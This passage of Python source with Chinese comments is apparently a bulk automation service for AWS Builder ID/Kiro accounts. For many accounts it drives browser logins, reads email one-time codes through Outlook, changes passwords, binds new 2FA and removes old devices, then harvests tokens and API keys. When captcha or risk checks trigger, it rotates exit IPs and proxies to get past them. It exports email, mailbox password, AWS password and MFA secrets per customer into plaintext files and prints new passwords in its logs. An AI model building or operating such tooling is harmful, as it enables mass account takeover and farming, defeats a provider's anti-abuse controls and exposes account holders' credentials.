        log(f"已提供 2FA 密钥（{mask_mfa_secret(mfa_secret)}）；验证码页将按页面要求使用 2FA 或邮箱验证码")
    mailbox = None
    if mail_password:
        mailbox = outlook_otp.GraphMailbox(acc.email, mail_password, proxy=acc.proxy, log=log)
        try:
            mailbox.ensure_token()
            log("Outlook 邮箱可读取，准备收 AWS 验证码")
        except Exception as exc:
            if not mfa_secret:
                log(f"Outlook 邮箱无法读信：{exc}")
                return AccountResult(acc.idx, acc.email, False, str(exc))
            log(f"Outlook 邮箱无法读信，将仅能使用 2FA：{exc}")
            mailbox = None

    start_url = dca.BUILDER_ID_START_URL
    oidc_region = dca.normalize_oidc_region(acc.region) if acc.region else options["oidc_region"]
    kiro_region = dca.normalize_kiro_region(acc.region) if acc.region else options["kiro_region"]
    start = dca.register_and_start(
        oidc_region=oidc_region,
        kiro_region=kiro_region,
        auth_method="builder-id",
        start_url=start_url,
        log=log,
    )
    if not start.ok:
        log(f"获取登录 URL 失败：{start.error}")
        return AccountResult(acc.idx, acc.email, False, start.error)

    new_password = random_account_password() if options.get("password_mode") == "random" else options["new_password"]

    def _drive_once(login_url: str) -> idc.LoginOutcome:
        return builderid.drive_login(
            login_url,
            acc.email,
            acc.password,
            mail_password=mail_password,
            new_password=new_password,
            log=log,
            headless=options["headless"],
            proxy=acc.proxy,
            timeout_s=options["login_timeout"],
            failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
            window_index=acc.idx - 1,
            window_count=options["threads"],
            debug_dir=str(debug_dir),
            stop_event=job.stop_event,
            mailbox=mailbox,
            mfa_secret=mfa_secret,
            profile_dir=profile_dir,
        )

    log("已获取登录 URL，开始 Builder ID 浏览器登录")
    outcome = _drive_once(start.verification_uri_complete)

    rc_max = int(options.get("risk_retry", 3) if options.get("risk_retry") is not None else 3)
    rc_attempt = 0
    pool_i = [0]
    while not outcome.ok and rc_attempt < rc_max and not job.stop_event.is_set():
        if not (is_captcha_error(outcome.error) or is_proxy_conn_error(outcome.error)):
            break
        rc_attempt += 1
        reason = "验证码/风控" if is_captcha_error(outcome.error) else "代理连接异常"
        if not switch_exit_ip(acc, options, log, reason, rc_attempt, rc_max, pool_i):
            break
        start_rc = dca.register_and_start(
            oidc_region=oidc_region,
            kiro_region=kiro_region,
            auth_method="builder-id",
            start_url=start_url,
            log=log,
        )
        if not start_rc.ok:
            log(f"风控重试时重新获取登录 URL 失败：{start_rc.error}")
            break
        start = start_rc
        log(f"风控规避重试（第 {rc_attempt}/{rc_max} 次）")
        outcome = _drive_once(start.verification_uri_complete)

    if not outcome.ok:
        log(f"浏览器登录失败：{outcome.error}")
        return AccountResult(
            acc.idx,
            acc.email,
            False,
            outcome.error,
            outcome.changed_password,
            mfa_secret=outcome.mfa_secret or mfa_secret,
            final_password=new_password if outcome.changed_password else "",
        )

    log("浏览器授权完成，开始换取 token")
    export_password = new_password if outcome.changed_password else acc.password
    exp = dca.poll_for_token(
        start,
        fetch_profile=False,
        log=log,
        stop_event=job.stop_event,
        timeout_s=options.get("token_wait", DEFAULT_TOKEN_WAIT_SECONDS),
    )
    if exp.error:
        log(f"换取 token 失败：{exp.error}")
        return AccountResult(
            acc.idx,
            acc.email,
            False,
            exp.error,
            outcome.changed_password,
            mfa_secret=outcome.mfa_secret or mfa_secret,
            final_password=export_password,
        )
    exp.email = acc.email
    exp.auth_method = "builder-id"
    exp.start_url = start_url

    log("token 获取成功，Builder ID 使用内置 profileArn")
    profiles = [{"arn": KIRO_BUILDER_ID_PROFILE_ARN, "region": "us-east-1"}]
    if options.get("strict_probe"):
        for profile in profiles:
            check_error = check_profile_available(exp, profile, True)
            if check_error:
                log(check_error)
                return AccountResult(
                    acc.idx,
                    acc.email,
                    False,
                    check_error,
                    outcome.changed_password,
                    mfa_secret=outcome.mfa_secret or mfa_secret,
                    final_password=export_password,
                )

    exported: list[dict[str, Any]] = []
    for profile in profiles:
        exported.append(flatten_export(
            exp, acc.email, profile, 0, export_password, acc.mfa_secret,
            auth_method="builder-id", provider="BuilderId", idp="Personal",
        ))

    api_keys: list[str] = []
    if options.get("create_api_keys") or options.get("api_key_only"):
        api_label = options.get("api_key_label") or "1"
        for profile in profiles:
            try:
                api_keys.append(create_api_key_export(exp, acc.email, profile, api_label, log))
            except Exception as exc:
                log(f"API Key 创建失败：{exc}")
                return AccountResult(
                    acc.idx, acc.email, False,
                    f"登录成功但 API Key 创建失败：{exc}",
                    outcome.changed_password, exported, api_keys,
                    outcome.mfa_secret or mfa_secret,
                    final_password=export_password,
                )
    suffix = f"，apiKeys={len(api_keys)}" if (options.get("create_api_keys") or options.get("api_key_only")) else ""
    suffix += "，未改密（沿用原密码）" if not outcome.changed_password else f"，新密码={export_password}"
    log(f"账号处理完成：profile {len(exported)} 个{suffix}")
    return AccountResult(
        acc.idx, acc.email, True,
        f"完成：profile {len(exported)} 个{suffix}",
        outcome.changed_password, exported, api_keys,
        outcome.mfa_secret or mfa_secret,
        final_password=export_password,
    )


def run_one(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    # M365 / 外部 IdP 路径：完全不同的登录编排，早路由出去。
    if options.get("login_mode") == "m365":
        return run_one_m365(job, acc, options)
    if options.get("login_mode") in ("google", "github"):
        return run_one_social(job, acc, options, options.get("login_mode") or "google")
    if options.get("login_mode") in STUDENT_LOGIN_MODES:
        return run_one_student(job, acc, options)
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    # 任务已被中断：未开始的账号直接跳过，不再发起登录/轮询
    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    # 效率优先：不做启动错峰等待；若触发风控/验证码，失败后立即换 IP 重试。
    # MFA 密钥早期落盘：抠到密钥的瞬间立刻完整写盘（不脱敏、不等绑定结果）。
    # 即使后续被取消/超时/AWS 卡住/进程崩溃，密钥也已安全保存到下面这个文件。
    # 文件名带 -early- 区分；最终绑定成功的密钥仍走原 kiro-mfa-secrets-{job}.txt。
    out_dir = Path(__file__).parent / "exports" / job.customer_id
    debug_dir = Path(__file__).parent / "debug_mfa" / job.id / f"{acc.idx:03d}"
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
        out_dir.chmod(0o700)
    except Exception:
        pass
    early_mfa_path = out_dir / f"kiro-mfa-secrets-early-{job.id}.txt"
    saved_early: dict[str, bool] = {"done": False}

    def _save_mfa_early(secret: str) -> None:
        try:
            line = f"{acc.email}:{secret}\n"
            with early_mfa_path.open("a", encoding="utf-8") as fh:
                fh.write(line)
            try:
                early_mfa_path.chmod(0o600)
            except Exception:
                pass
            # 立刻把下载入口指向早期文件：即使后续绑定失败/取消，前端也能下载到完整密钥。
            # 若之后绑定成功，run_job 末尾会用最终文件覆盖此路径（两者都含完整密钥）。
            with JOBS_LOCK:
                if not job.mfa_secrets_path:
                    job.mfa_secrets_path = str(early_mfa_path)
            if not saved_early["done"]:
                log(f"MFA 密钥已立刻完整落盘：{early_mfa_path.name}（{len(secret)} 位），可在任务完成后下载")
                saved_early["done"] = True
            save_job_history()
            audit("mfa.early_saved", jobId=job.id, customerId=job.customer_id,
                  email=acc.email, length=len(secret), path=str(early_mfa_path))
        except Exception as exc:
            log(f"MFA 密钥落盘失败：{exc}")

    # 改密后的新密码立刻落盘：改密成功的瞬间就把新密码写进独立文件（不等导出步骤）。
    # 即使后续扫 profile / 取 token / 进程崩溃，新密码也已安全保存，账号不会变成「未知密码」死号。
    early_pw_path = out_dir / f"kiro-changed-passwords-{job.id}.txt"
    saved_pw: dict[str, Any] = {"done": False, "password": ""}

    def _save_password_early(new_pw: str) -> None:
        if new_pw:
            saved_pw["password"] = new_pw
        if not new_pw or saved_pw["done"]:
            return
        try:
            with early_pw_path.open("a", encoding="utf-8") as fh:
                fh.write(f"{acc.email}:{new_pw}\n")
            try:
                early_pw_path.chmod(0o600)
            except Exception:
                pass
            saved_pw["done"] = True
            log(f"新密码已立刻落盘：{acc.email} → {new_pw}（已写入 {early_pw_path.name}，改密成功即保存，防丢号）")
            save_job_history()
            audit("password.early_saved", jobId=job.id, customerId=job.customer_id, email=acc.email)
        except Exception as exc:
            log(f"新密码落盘失败：{exc}")

    log("开始登录")
    # 每账号可自带 start_url + region（管道式格式）；缺省时回退到全局选项。
    eff_start_url = acc.start_url or options["start_url"]
    eff_oidc_region = dca.normalize_oidc_region(acc.region) if acc.region else options["oidc_region"]
    eff_kiro_region = dca.normalize_kiro_region(acc.region) if acc.region else options["kiro_region"]
    if acc.start_url:
        log(f"用账号自带 Start URL/Region：{eff_start_url}（region={eff_kiro_region}）")
    start = dca.register_and_start(
        oidc_region=eff_oidc_region,
        kiro_region=eff_kiro_region,
        start_url=eff_start_url,
        log=log,
    )
    if not start.ok:
        log(f"获取登录 URL 失败：{start.error}")
        return AccountResult(acc.idx, acc.email, False, start.error)

    log("已获取登录 URL，开始浏览器登录")
    new_password = random_account_password() if options.get("password_mode") == "random" else options["new_password"]

    def _drive_once(login_url: str, candidate_new_password: str) -> idc.LoginOutcome:
        return idc.drive_login(
            login_url,
            acc.email,
            acc.password,
            candidate_new_password,
            log=log,
            headless=options["headless"],
            proxy=acc.proxy,
            timeout_s=options["login_timeout"],
            failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
            window_index=acc.idx - 1,
            window_count=options["threads"],
            debug_dir=str(debug_dir),
            stop_event=job.stop_event,
            mfa_secret=acc.mfa_secret,
            on_secret=_save_mfa_early,
            on_password_changed=_save_password_early,
        )

    outcome = _drive_once(start.verification_uri_complete, new_password)
    if outcome.changed_password:
        _save_password_early(new_password)

    # 风控规避：撞 captcha / 代理连接失败 → 换出口 IP + 重新取登录URL + 重试。
    # 换 IP 两种方式（按优先级）：
    #   1) 本地部署配了 mihomo 控制器 → 切节点换出口 IP（pick_and_switch）；
    #   2) 开源通用：未配 mihomo 但提交了代理池 → 在池内轮换下一个代理（换 IP）。
    # 效率第一：不再做 30~90s 随机等待，也不做代理错误指数退避；失败后直接换 IP 快速推进。
    rc_max = int(options.get("risk_retry", 3) if options.get("risk_retry") is not None else 3)
    rc_attempt = 0
    # 代理池轮换游标（仅无 mihomo 时使用）：从当前代理的下一个开始，避开重复。
    _pool = [p for p in (options.get("proxy_pool") or []) if p]
    _pool_i = 0
    while (not outcome.ok and rc_attempt < rc_max
           and not (job.stop_event and job.stop_event.is_set())
           and (is_captcha_error(outcome.error) or is_proxy_conn_error(outcome.error))):
        rc_attempt += 1
        reason = "验证码/风控" if is_captcha_error(outcome.error) else "代理连接异常"
        if job.stop_event and job.stop_event.is_set():
            break
        switched = False
        # 方式 1：mihomo 切节点换出口 IP
        if mihomo.enabled():
            log(f"{reason}，立即换出口 IP 重试（第 {rc_attempt}/{rc_max} 次）")
            mihomo.pick_and_switch(exclude=mihomo.current_node(), log=log)
            switched = True
            # 撞 captcha 后短暂冷却，避免同一出口连续高频请求被风控叠加
            if is_captcha_error(outcome.error):
                cd = random.uniform(3.0, 7.0)
                slept = 0.0
                while slept < cd and not (job.stop_event and job.stop_event.is_set()):
                    time.sleep(min(1.0, cd - slept))
                    slept += 1.0
        # 方式 2（开源通用）：无 mihomo 但有代理池 → 轮换下一个代理
        elif _pool:
            # 从池里选一个与当前不同的代理
            picked = ""
            for _ in range(len(_pool)):
                cand = _pool[_pool_i % len(_pool)]
                _pool_i += 1
                if cand != acc.proxy:
                    picked = cand
                    break
            if picked:
                acc.proxy = picked
                switched = True
                # 代理不回显完整串（可能含账密），只显 host
                _host = picked.split("://", 1)[-1].split("@")[-1].split("/", 1)[0]
                log(f"{reason}，已轮换代理池下一个代理→ {_host}（第 {rc_attempt}/{rc_max} 次）")
                if is_captcha_error(outcome.error):
                    cd = random.uniform(3.0, 7.0)
                    slept = 0.0
                    while slept < cd and not (job.stop_event and job.stop_event.is_set()):
                        time.sleep(min(1.0, cd - slept))
                        slept += 1.0
            else:
                log(f"{reason}，代理池无其他可用代理可换，停止重试（第 {rc_attempt}/{rc_max} 次）")
                break
        else:
            # 既无 mihomo 也无代理池：换不了 IP，重试只会撞同样的风控，直接停。
            log(f"{reason}，未配置换 IP 能力（无 mihomo 控制器且未提交代理池），无法解 captcha，停止重试")
            break
        if not switched:
            break
        # 重新获取登录 URL(旧 device code 已失效)
        start_rc = dca.register_and_start(
            oidc_region=eff_oidc_region,
            kiro_region=eff_kiro_region,
            start_url=eff_start_url,
            log=log,
        )
        if not start_rc.ok:
            log(f"风控重试时重新获取登录 URL 失败：{start_rc.error}")
            break
        start = start_rc
        log(f"风控规避重试（第 {rc_attempt}/{rc_max} 次）")
        outcome = _drive_once(start.verification_uri_complete, new_password)
        if outcome.changed_password:
            _save_password_early(new_password)

    if (not outcome.ok
            and looks_like_password_policy_error(outcome.error)
            and not (job.stop_event and job.stop_event.is_set())):
        # 策略错误时改密本就不会成功（changed_password 仍为 False），
        # 所以重试不能依赖 changed_password，只要识别为策略错误就换更强密码重试一次。
        retry_password = stronger_account_password()
        log("首次改密密码策略不通过，自动生成更强新密码并重试一次")
        start_retry = dca.register_and_start(
            oidc_region=eff_oidc_region,
            kiro_region=eff_kiro_region,
            start_url=eff_start_url,
            log=log,
        )
        if not start_retry.ok:
            log(f"重新获取登录 URL 失败：{start_retry.error}")
            return AccountResult(acc.idx, acc.email, False, start_retry.error, outcome.changed_password)
        retry_outcome = _drive_once(start_retry.verification_uri_complete, retry_password)
        if retry_outcome.changed_password:
            _save_password_early(retry_password)
        if retry_outcome.ok:
            log("自动重试改密成功")
            start = start_retry
            new_password = retry_password
            outcome = retry_outcome
        else:
            outcome = retry_outcome
    if not outcome.ok:
        log(f"浏览器登录失败：{outcome.error}")
        final_password = str(saved_pw.get("password") or "") if outcome.changed_password else ""
        return AccountResult(
            acc.idx,
            acc.email,
            False,
            outcome.error,
            outcome.changed_password,
            mfa_secret=outcome.mfa_secret or acc.mfa_secret,
            final_password=final_password,
        )

    log("浏览器授权完成，开始换取 token")
    if outcome.mfa_secret:
        log(f"已绑定新 MFA，密钥：{mask_mfa_secret(outcome.mfa_secret)}（完整密钥请下载 MFA 文件妥善保存）")

    exp = dca.poll_for_token(
        start,
        fetch_profile=False,
        log=log,
        stop_event=job.stop_event,
        timeout_s=options.get("token_wait", DEFAULT_TOKEN_WAIT_SECONDS),
    )
    export_password = str(saved_pw.get("password") or new_password) if outcome.changed_password else acc.password
    export_mfa_secret = outcome.mfa_secret or acc.mfa_secret
    if exp.error:
        log(f"换取 token 失败：{exp.error}")
        return AccountResult(
            acc.idx,
            acc.email,
            False,
            exp.error,
            outcome.changed_password,
            mfa_secret=export_mfa_secret,
            final_password=export_password,
        )
    exp.email = acc.email

    log("token 获取成功，开始扫描 profileArn")
    profiles = list_profiles_all_regions(exp.access_token, eff_kiro_region, log, options.get("scan_all_regions", False))
    if not profiles:
        log("未获取到 profileArn")
        return AccountResult(
            acc.idx,
            acc.email,
            False,
            "登录成功但未获取到 profileArn（已扫描首选区 + us-east-1/eu-central-1；若首选区域错误已自动回退）",
            outcome.changed_password,
            mfa_secret=export_mfa_secret,
            final_password=export_password,
        )

    exported: list[dict[str, Any]] = []
    for profile in profiles:
        check_error = check_profile_available(exp, profile, options.get("strict_probe", False))
        if check_error:
            log(check_error)
            return AccountResult(
                acc.idx,
                acc.email,
                False,
                check_error,
                outcome.changed_password,
                mfa_secret=export_mfa_secret,
                final_password=export_password,
            )
        exported.append(flatten_export(exp, acc.email, profile, 0, export_password, export_mfa_secret))
    api_keys: list[str] = []
    if options.get("create_api_keys") or options.get("api_key_only"):
        api_label = options.get("api_key_label") or "1"
        for profile in profiles:
            try:
                api_keys.append(create_api_key_export(exp, acc.email, profile, api_label, log))
            except Exception as exc:
                log(f"API Key 创建失败：{exc}")
                return AccountResult(
                    acc.idx,
                    acc.email,
                    False,
                    f"登录成功但 API Key 创建失败：{exc}",
                    outcome.changed_password,
                    exported,
                    api_keys,
                    export_mfa_secret,
                    final_password=export_password,
                )
    suffix = f"，apiKeys={len(api_keys)}" if (options.get("create_api_keys") or options.get("api_key_only")) else ""
    if outcome.mfa_secret:
        suffix += "，已绑定 MFA"
    if outcome.changed_password:
        suffix += f"，新密码={export_password}"
    else:
        suffix += "，未改密（沿用原密码）"
    log(f"账号处理完成：profile {len(exported)} 个{suffix}")
    return AccountResult(acc.idx, acc.email, True, f"完成：profile {len(exported)} 个{suffix}", outcome.changed_password, exported, api_keys, outcome.mfa_secret, final_password=export_password)


def _job_out_dir(job: Job) -> Path:
    out_dir = Path(__file__).parent / "exports" / job.customer_id
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
        out_dir.chmod(0o700)
    except Exception:
        pass
    return out_dir


def _iso_now() -> str:
    return dt.datetime.now(dt.timezone.utc).isoformat()


def _password_ledger_paths(job: Job) -> tuple[Path, Path]:
    out_dir = _job_out_dir(job)
    return (
        out_dir / f"kiro-password-ledger-{job.id}.json",
        out_dir / f"kiro-changed-passwords-{job.id}.txt",
    )


def _load_password_ledger_unlocked(job: Job) -> dict[str, Any]:
    ledger_path, _plain_path = _password_ledger_paths(job)
    if ledger_path.exists():
        try:
            data = json.loads(ledger_path.read_text(encoding="utf-8"))
            if isinstance(data, dict):
                data.setdefault("jobId", job.id)
                data.setdefault("accounts", [])
                if not isinstance(data.get("accounts"), list):
                    data["accounts"] = []
                return data
        except Exception as exc:
            logger.warning("load password ledger failed: job=%s error=%s", job.id, exc)
    return {"jobId": job.id, "accounts": []}


def _flush_password_ledger_unlocked(job: Job, ledger: dict[str, Any]) -> None:
    """Persist ledger JSON and the write-ahead email:password file.

    The plaintext file is rewritten from the ledger but never drops an intended
    password: once recorded, it stays until the job files expire.
    """
    ledger_path, plain_path = _password_ledger_paths(job)
    ledger["jobId"] = job.id
    ledger["updatedAt"] = _iso_now()
    tmp = ledger_path.with_suffix(".json.tmp")
    tmp.write_text(json.dumps(ledger, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    try:
        tmp.chmod(0o600)
    except Exception:
        pass
    tmp.replace(ledger_path)
    try:
        ledger_path.chmod(0o600)
    except Exception:
        pass
    lines: list[str] = []
    seen: set[str] = set()
    for item in ledger.get("accounts") or []:
        email = str(item.get("email") or "").strip()
        pwd = str(item.get("newPassword") or "").strip()
        if not email or not pwd or email in seen:
            continue
        seen.add(email)
        lines.append(f"{email}:{pwd}")
    if lines:
        plain_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        try:
            plain_path.chmod(0o600)
        except Exception:
            pass
    with JOBS_LOCK:
        job.password_ledger_path = str(ledger_path)
        if lines:
            job.accounts_pw_path = str(plain_path)
    save_job_history()


def _ledger_item_for_email(ledger: dict[str, Any], email: str) -> Optional[dict[str, Any]]:
    for item in ledger.get("accounts") or []:
        if isinstance(item, dict) and item.get("email") == email:
            return item
    return None


def record_intended_password(job: Job, acc: AccountInput, new_password: str, log) -> dict[str, Any]:
    """Write the intended new password BEFORE the site change is attempted."""
    if not new_password:
        return {}
    now = _iso_now()
    with PASSWORD_LEDGER_LOCK:
        ledger = _load_password_ledger_unlocked(job)
        item = _ledger_item_for_email(ledger, acc.email)
        if item is None:
            item = {
                "email": acc.email,
                "oldPassword": acc.password,
                "newPassword": new_password,
                "status": "pending",
                "applied": False,
                "error": "",
                "recordedAt": now,
                "updatedAt": now,
            }
            ledger.setdefault("accounts", []).append(item)
        else:
            item["oldPassword"] = acc.password
            item["newPassword"] = new_password
            if item.get("status") not in {"success", "applied", "failed_after_apply"}:
                item["status"] = "pending"
            item["error"] = ""
            item["updatedAt"] = now
            item.setdefault("recordedAt", now)
        _flush_password_ledger_unlocked(job, ledger)
    if log:
        log(f"新密码已预先落盘：{acc.email} → {new_password}（台账 pending，改密成功/失败后再更新状态）")
    audit("password.intended_recorded", jobId=job.id, customerId=job.customer_id, email=acc.email)
    return item


def mark_password_applied(job: Job, acc: AccountInput, new_password: str, log) -> None:
    """Site accepted the new password. Record that even if later steps fail."""
    if not new_password:
        return
    now = _iso_now()
    with PASSWORD_LEDGER_LOCK:
        ledger = _load_password_ledger_unlocked(job)
        item = _ledger_item_for_email(ledger, acc.email)
        if item is None:
            item = {
                "email": acc.email,
                "oldPassword": acc.password,
                "newPassword": new_password,
                "status": "applied",
                "applied": True,
                "error": "",
                "recordedAt": now,
                "updatedAt": now,
            }
            ledger.setdefault("accounts", []).append(item)
        else:
            item["newPassword"] = new_password
            item["applied"] = True
            if item.get("status") in {"pending", "failed", ""}:
                item["status"] = "applied"
            item["updatedAt"] = now
        _flush_password_ledger_unlocked(job, ledger)
    if log:
        log(f"站点已接受新密码，台账标记 applied：{acc.email} → {new_password}")
    audit("password.applied_recorded", jobId=job.id, customerId=job.customer_id, email=acc.email)


def update_password_ledger_status(job: Job, acc: AccountInput, status: str, error: str = "", log=None) -> None:
    now = _iso_now()
    with PASSWORD_LEDGER_LOCK:
        ledger = _load_password_ledger_unlocked(job)
        item = _ledger_item_for_email(ledger, acc.email)
        if item is None:
            return
        if status == "failed" and item.get("applied"):
            item["status"] = "failed_after_apply"
        else:
            item["status"] = status
        item["error"] = error or ""
        item["updatedAt"] = now
        _flush_password_ledger_unlocked(job, ledger)
    if log:
        shown = item.get("status") if item else status
        log(f"密码台账状态已更新：{acc.email} → {shown}")


def read_password_ledger(job: Job) -> dict[str, Any]:
    with PASSWORD_LEDGER_LOCK:
        return _load_password_ledger_unlocked(job)


def _make_early_password_saver(job: Job, acc: AccountInput, log):
    saved_pw: dict[str, Any] = {"done": False, "password": ""}

    def _save_password_early(new_pw: str) -> None:
        if not new_pw:
            return
        saved_pw["password"] = new_pw
        try:
            mark_password_applied(job, acc, new_pw, log)
            saved_pw["done"] = True
        except Exception as exc:
            log(f"新密码落盘失败：{exc}")

    return saved_pw, _save_password_early


def _make_early_mfa_saver(job: Job, acc: AccountInput, log):
    out_dir = _job_out_dir(job)
    early_mfa_path = out_dir / f"kiro-mfa-secrets-early-{job.id}.txt"
    saved_early: dict[str, bool] = {"done": False}

    def _save_mfa_early(secret: str) -> None:
        if not secret:
            return
        try:
            with early_mfa_path.open("a", encoding="utf-8") as fh:
                fh.write(f"{acc.email}:{secret}\n")
            try:
                early_mfa_path.chmod(0o600)
            except Exception:
                pass
            with JOBS_LOCK:
                if not job.mfa_secrets_path:
                    job.mfa_secrets_path = str(early_mfa_path)
            if not saved_early["done"]:
                log(f"MFA 密钥已立刻完整落盘：{early_mfa_path.name}（{len(secret)} 位），可在任务完成后下载")
                saved_early["done"] = True
            save_job_history()
            audit("mfa.early_saved", jobId=job.id, customerId=job.customer_id,
                  email=acc.email, length=len(secret), path=str(early_mfa_path))
        except Exception as exc:
            log(f"MFA 密钥落盘失败：{exc}")

    return _save_mfa_early


def _security_change_message(do_change_password: bool, do_change_mfa: bool,
                             changed_password: bool, changed_mfa: bool,
                             final_password: str, mfa_secret: str,
                             do_remove_old_mfa: bool = False) -> str:
    parts: list[str] = []
    if do_change_password:
        if changed_password and final_password:
            parts.append(f"新密码={final_password}")
        else:
            parts.append("密码未改")
    elif changed_password and final_password:
        parts.append(f"首次登录已改密，新密码={final_password}")
    if do_change_mfa:
        if changed_mfa and mfa_secret:
            parts.append("已设置新2FA并删除旧设备")
        elif mfa_secret:
            parts.append("2FA 密钥已保存")
        else:
            parts.append("2FA 未改")
    elif do_remove_old_mfa:
        parts.append("已清理旧2FA")
    if not parts:
        return "登录后未选择修改项"
    return "，".join(parts)


def _export_job_mfa_secrets(job: Job, out_dir: Path) -> None:
    mfa_map: dict[str, str] = {}
    for r in job.results:
        if r.mfa_secret:
            mfa_map[r.email] = r.mfa_secret
    early_only = 0
    early_mfa_path = out_dir / f"kiro-mfa-secrets-early-{job.id}.txt"
    if early_mfa_path.exists():
        try:
            for line in early_mfa_path.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if not line or ":" not in line:
                    continue
                em, _, sec = line.partition(":")
                em = em.strip()
                sec = sec.strip()
                if em and sec and em not in mfa_map:
                    mfa_map[em] = sec
                    early_only += 1
        except Exception as exc:
            job.log(f"合并 early MFA 密钥失败：{exc}")
    mfa_lines = [f"{em}:{sec}" for em, sec in mfa_map.items()]
    if mfa_lines:
        mfa_path = out_dir / f"kiro-mfa-secrets-{job.id}.txt"
        mfa_path.write_text("\n".join(mfa_lines) + "\n", encoding="utf-8")
        mfa_path.chmod(0o600)
        job.mfa_secrets_path = str(mfa_path)
        extra = f"（含 {early_only} 个登录未完成但已抠到密钥的账号）" if early_only else ""
        job.log(f"本次新绑定 MFA 账号 {len(mfa_lines)} 个，密钥已导出{extra}（务必下载保存）")


def _read_secret_lines(path: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    if not path.exists():
        return out
    try:
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, _, secret = line.partition(":")
            email = email.strip()
            secret = secret.strip()
            if email and secret:
                out[email] = secret
    except Exception:
        pass
    return out


def _export_combined_credentials(job: Job, out_dir: Path) -> None:
    """Write one grouped email|emailpass|awspass|mfa document.

    A password recorded as ``pending`` is only an intended password, not a
    current password. Likewise, an MFA secret saved early is not enough by
    itself to prove that the new device was registered. The combined document
    therefore uses mutation markers from the result/ledger and keeps failed
    accounts in an explicitly labelled, unchanged section.
    """
    def key(email: str) -> str:
        return (email or "").strip().lower()

    password_map: dict[str, str] = {}
    password_changed: set[str] = set()
    ledger = read_password_ledger(job)
    for item in ledger.get("accounts") or []:
        if not isinstance(item, dict):
            continue
        email = str(item.get("email") or "").strip()
        password = str(item.get("newPassword") or "").strip()
        status = str(item.get("status") or "").strip()
        if email and password and (item.get("applied") or status in {"success", "applied", "failed_after_apply"}):
            normalized = key(email)
            password_map[normalized] = password
            password_changed.add(normalized)
    for result in job.results:
        normalized = key(result.email)
        if not normalized or not result.changed_password:
            continue
        password_changed.add(normalized)
        if result.final_password:
            password_map[normalized] = result.final_password.strip()

    saved_mfa_map: dict[str, str] = {}
    for path in (
        out_dir / f"kiro-mfa-secrets-early-{job.id}.txt",
        out_dir / f"kiro-mfa-secrets-{job.id}.txt",
    ):
        for email, secret in _read_secret_lines(path).items():
            if email and secret:
                saved_mfa_map[key(email)] = secret.strip()

    mfa_map: dict[str, str] = {}
    mfa_changed: set[str] = set()
    for result in job.results:
        normalized = key(result.email)
        if not normalized or not result.changed_mfa:
            continue
        mfa_changed.add(normalized)
        secret = (result.mfa_secret or "").strip() or saved_mfa_map.get(normalized, "")
        if secret:
            mfa_map[normalized] = secret

    result_by_email = {
        key(result.email): result
        for result in job.results
        if key(result.email)
    }
    account_by_email: dict[str, AccountInput] = {}
    ordered_keys: list[str] = []
    for account in job.accounts:
        normalized = key(account.email)
        if not normalized or normalized in account_by_email:
            continue
        account_by_email[normalized] = account
        ordered_keys.append(normalized)
    for result in job.results:
        normalized = key(result.email)
        if normalized and normalized not in account_by_email and normalized not in ordered_keys:
            ordered_keys.append(normalized)

    grouped_rows: dict[str, list[str]] = {
        "complete": [],
        "partial": [],
        "unchanged": [],
    }
    for normalized in ordered_keys:
        account = account_by_email.get(normalized)
        result = result_by_email.get(normalized)
        email = (account.email if account else (result.email if result else "")).strip()
        if not email:
            continue

        # A successful result is a complete task result. A failed result is
        # partial only when the password/MFA mutation marker proves that some
        # security state already changed before a later step failed.
        mutated = normalized in password_changed or normalized in mfa_changed
        bucket = "complete" if result and result.ok else ("partial" if mutated else "unchanged")

        email_password = (account.mail_password if account else "").strip()
        if normalized in password_changed:
            # Do not fall back to the old password after a confirmed change.
            # An empty value is safer than claiming the old password is current.
            aws_password = password_map.get(normalized, "")
        else:
            aws_password = (account.password if account else "").strip()

        if normalized in mfa_changed:
            # Do not fall back to the old MFA after a confirmed replacement.
            mfa_secret = mfa_map.get(normalized, "")
        else:
            mfa_secret = (account.mfa_secret if account else "").strip()
        grouped_rows[bucket].append(f"{email}|{email_password}|{aws_password}|{mfa_secret}")

    if not any(grouped_rows.values()):
        return

    path = out_dir / f"kiro-credentials-email-emailpass-awspass-mfa-{job.id}.txt"
    lines = ["email|emailpass|awspass|mfa"]
    section_labels = (
        ("complete", "完全成功"),
        ("partial", "部分成功"),
        ("unchanged", "没有修改"),
    )
    for bucket, label in section_labels:
        rows = grouped_rows[bucket]
        lines.append(f"# {label}（{len(rows)} 个）")
        if bucket == "unchanged":
            lines.append("# 以下为本次输入的原始凭据；任务未确认发生修改，不代表本次已验证登录")
        lines.extend(rows or ["# 无"])
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    path.chmod(0o600)
    job.combined_credentials_path = str(path)
    job.log(
        f"已生成分块合并账密/MFA 文件：{path.name}（"
        f"完全成功 {len(grouped_rows['complete'])}，"
        f"部分成功 {len(grouped_rows['partial'])}，"
        f"没有修改 {len(grouped_rows['unchanged'])}，"
        "格式 email|emailpass|awspass|mfa）"
    )


def _export_security_changes(job: Job, out_dir: Path) -> None:
    """Write a local document with every account whose password/MFA changed."""
    password_map: dict[str, str] = {}
    ledger = read_password_ledger(job)
    for item in ledger.get("accounts") or []:
        if not isinstance(item, dict):
            continue
        email = str(item.get("email") or "").strip()
        password = str(item.get("newPassword") or "").strip()
        status = str(item.get("status") or "").strip()
        if email and password and (item.get("applied") or status in {"success", "applied", "failed_after_apply"}):
            password_map[email] = password
    for result in job.results:
        if result.email and result.changed_password and result.final_password:
            password_map[result.email] = result.final_password

    mfa_map: dict[str, str] = {}
    for result in job.results:
        if result.email and result.changed_mfa and result.mfa_secret:
            mfa_map[result.email] = result.mfa_secret
    for path in (
        out_dir / f"kiro-mfa-secrets-early-{job.id}.txt",
        out_dir / f"kiro-mfa-secrets-{job.id}.txt",
    ):
        for email, secret in _read_secret_lines(path).items():
